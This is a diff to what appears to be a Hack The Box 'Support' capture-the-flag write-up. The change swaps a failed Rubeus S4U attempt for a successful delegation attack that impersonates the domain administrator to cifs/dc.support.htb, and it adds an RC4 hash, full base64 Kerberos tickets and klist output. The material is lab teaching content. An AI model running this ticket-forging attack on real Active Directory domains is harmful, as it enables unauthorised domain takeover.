@@ -1395,7 +1395,7 @@ importing rubeus
 ```
 
 ```
-*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt
+*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:"cifs/dc.support.htb" /ptt
 
    ______        _
   (_____ \      | |
@@ -1414,29 +1414,29 @@ importing rubeus
 [*] base64(ticket.kirbi):
 
       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
-      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
+      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
       cnQuaHRi
 
 
@@ -1445,22 +1445,84 @@ importing rubeus
 [*] Using domain controller: dc.support.htb (::1)
 [*] Building S4U2self request for: 'attackersystem$@SUPPORT.HTB'
 [*] Sending S4U2self request
+[+] S4U2self success!
+[*] Got a TGS for 'administrator' to 'attackersystem$@SUPPORT.HTB'
+[*] base64(ticket.kirbi):
 
-[X] KRB-ERROR (6) : KDC_ERR_C_PRINCIPAL_UNKNOWN
+      doIFsjCCBa6gAwIBBaEDAgEWooIEyTCCBMVhggTBMIIEvaADAgEFoQ0bC1NVUFBPUlQuSFRCohwwGqAD
+      AgEBoRMwERsPYXR0YWNrZXJzeXN0ZW0ko4IEhzCCBIOgAwIBF6EDAgEBooIEdQSCBHFwzKv0HIbs7qVd
+      aLbvJzT1oR7YCOLhR7FNujICkT2aGUOU0Ai8Yn4cYHobtzB/WdTmJyOZCknId+lkGPQd8OheStwPxAzM
+      gZBu4TJGhJd49YvhQxDZk3dtA/G+uG+gRax72tAD4NgdeBBEWphcf10nQ0abqWzdg6HR/rIrCjHvid5b
+      cj7VNbxwzd8jR+o0TE4YrC/NSxaNbhZNeS0OQAXf0mNFN5Svcb9+0RvEnfYhwK8DYSP/hL3e5zM5c27K
+      EEugJ6fS+JkS2RQlDRZVAy729qg/+RQ5kn1XiF2akMUb3jl55iYcrHy+W5UMrXshHM/Z7AXFIuY1FJ8e
+      pIwNKQh+K27DKzjM1uS9ryjpejVtQjfjqpdlsyuock79ZomVCqEnwORMGqPqsim1jyW8ajOrIJGBzCZq
+      5fBzVAStWe12t+uE7RK0N+QpKMxt8KNrgNqgBwnf5l+sEvhNbV8hT/CTHSMuOeRI9AFbtJ3Mqz1Vew6v
+      ENCPOTDDw7PQ0/fFl36ftsI9zIZ7Efa3itFdG8v3wvK5CCQKSDYdaLQIrd3pjhE6ydwzBngCPAtabhpa
+      alqxkQnoha5CuYgT7PB+B4Nxz3IUB5emoUif7gs+9fLpjvXJF4ZXjrPtk89jir4P/cmwcrfsQHxTT2Is
+      UmuXUkM55qwuI4CobThV9CFHvY/4lORnaNBHcZmW+gDQ7VNcfj0qeHSPpXSHpk1cm8ZYvr0Fxx6nQix0
+      JgHn+p5hISuGfzMOd6NHhXfKFUGIBYP/B//ltBn2hyA7PvoQL9Wv7OMb6JMr7Sb2uY9NAuWcylqzFB6r
+      4FsgiWd5Ts9rP1zq0KVxARmLvv9JYFz6iUS4zlpYUbDpJL+nUXBC/2e1NK8TBdx2Oij3+k2H7sTafnWZ
+      +JfIEin8Vm9bXL924G/vazqZelVYvR4LNeMTjbPW9j+f3gExOFNPc0t9T3eKSVMZENHyYQSULEpJwYGU
+      wH5FCWiF9sWBtxh/yVwi4VmB8Q2bvd+xOk67mtads9aCPMum5CuQ0BwL/IBUDgyXajo0sPkOCm0Dil3x
+      LnSy4p+6/+ilY8hZEJhvkwx2khVNMKwzKF/js4CI+AINMlF91t7YUNjpYIBNEgDyXe/Kh1zPsC3w/TuK
+      VSU1n/u7vQOK35HPGdFTO4AVLCWDbI5oPNMgAChpcw3fKUJqER2eLjNQVX/avUhjIKzmbyw9B6t/6YEC
+      iNWm2AEHKAwfpNmShLXzm4w2kdcHlTkdugT6PgTTMr6T+sNK6z+wROXU2JM6KaB2zj1EQMH0jGj7zI/8
+      dHnN3gE0/Yp37fDRkzu5LiDzOrthDJzWV3Hgorjsvcde7MY2S1rXcem1fpMJnEy3QZpzC9jVYNtYhjNp
+      v7gQBdlV66xayL4bos2NX8pp5cU0ZBroUJKZgetegXjaX4e4xPN3tMZNO7JpBR/1Zb7qGElK3EqE6HSR
+      Vu5p0WmmvyGzrEW6RpFyS4ocRjLQ7e7brPJ52AjPg/JnnUHZL80KZPdnmVF9fAejgdQwgdGgAwIBAKKB
+      yQSBxn2BwzCBwKCBvTCBujCBt6AbMBmgAwIBF6ESBBCWxXdGfhVjwxOu7kCzxABpoQ0bC1NVUFBPUlQu
+      SFRCohowGKADAgEKoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQKEAAKURGA8yMDI2MDcxMzE5MjcwNVqm
+      ERgPMjAyNjA3MTQwNTI3MDVapxEYDzIwMjYwNzIwMTkyNzA1WqgNGwtTVVBQT1JULkhUQqkcMBqgAwIB
+      AaETMBEbD2F0dGFja2Vyc3lzdGVtJA==
 
-[*] Impersonating user 'admin' to target SPN 'cifs/TARGETCOMPUTER.testlab.local'
+[*] Impersonating user 'administrator' to target SPN 'cifs/dc.support.htb'
 [*] Using domain controller: dc.support.htb (::1)
-[*] Building S4U2proxy request for service: 'cifs/TARGETCOMPUTER.testlab.local'
+[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
+[*] Sending S4U2proxy request
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':
 
-[!] Unhandled Rubeus exception:
+      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
+[+] Ticket successfully imported!
 
-System.NullReferenceException: Object reference not set to an instance of an object.
-   at Rubeus.S4U.S4U2Proxy(KRB_CRED kirbi, String targetUser, String targetSPN, String outfile, Boolean ptt, String domainController, String altService, KRB_CRED tgs, Boolean opsec)
-   at Rubeus.S4U.Execute(KRB_CRED kirbi, String targetUser, String targetSPN, String outfile, Boolean ptt, String domainController, String altService, KRB_CRED tgs, String targetDomainController, String targetDomain, Boolean s, Boolean opsec, Boolean bronzebit, String keyString, KERB_ETYPE encType, String requestDomain, String impersonateDomain)
-   at Rubeus.S4U.Execute(String userName, String domain, String keyString, KERB_ETYPE etype, String targetUser, String targetSPN, String outfile, Boolean ptt, String domainController, String altService, KRB_CRED tgs, String targetDomainController, String targetDomain, Boolean self, Boolean opsec, Boolean bronzebit)
-   at Rubeus.Commands.S4u.Execute(Dictionary`2 arguments)
-   at Rubeus.Domain.CommandCollection.ExecuteCommand(String commandName, Dictionary`2 arguments)
-   at Rubeus.Program.MainExecute(String commandName, Dictionary`2 parsedArgs)
+```
+
+
+```
+ klist
+Ticket cache: FILE:attacker.ccache
+Default principal: attackersystem$@SUPPORT.HTB
+
+Valid starting       Expires              Service principal
+07/13/2026 14:56:05  07/14/2026 00:56:05  krbtgt/support.htb@SUPPORT.HTB
+        renew until 07/20/2026 14:56:05
 
 ```
 ### Exploitation
